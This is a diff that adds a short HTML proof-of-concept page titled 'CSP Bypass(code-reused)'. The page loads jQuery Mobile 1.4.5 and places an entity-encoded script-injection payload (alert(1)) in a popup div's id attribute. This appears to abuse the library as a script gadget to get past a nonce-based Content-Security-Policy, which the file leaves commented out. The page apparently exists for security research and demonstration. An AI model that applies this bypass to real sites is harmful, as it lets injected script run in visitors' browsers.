@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv="Content-Security-Policy" content="style-src code.jquery.com;script-src 'nonce-secret123' 'strict-dynamic';"> -->
+    <link rel="stylesheet" href="https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css">
+    <script nonce="secret123" src="https://code.jquery.com/jquery-2.1.0.js"></script>
+    <script nonce="secret123" src="https://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.js"></script>
+</head>
+<body>
+    <div data-role="popup" id="--&#62;&#60;script&#62;alert(1)&#60;/script&#62;"></div>
+</body>
+</html>
